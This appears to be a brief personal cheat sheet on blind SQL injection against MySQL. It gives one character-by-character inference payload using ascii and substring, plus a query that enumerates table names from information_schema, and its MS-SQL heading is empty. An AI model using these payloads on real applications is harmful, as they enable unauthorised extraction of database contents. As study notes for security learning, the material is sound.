# Blind_SQL_Injection
MS-SQL Injection


MySQL
???' and ascii(substring((query), 1, 1)) > 'a'#

Get Table Name
select table_name from information_schema.tables where table_type='base table' limit 0,1
                                                                                     ㄴ> 0번 째 테이블
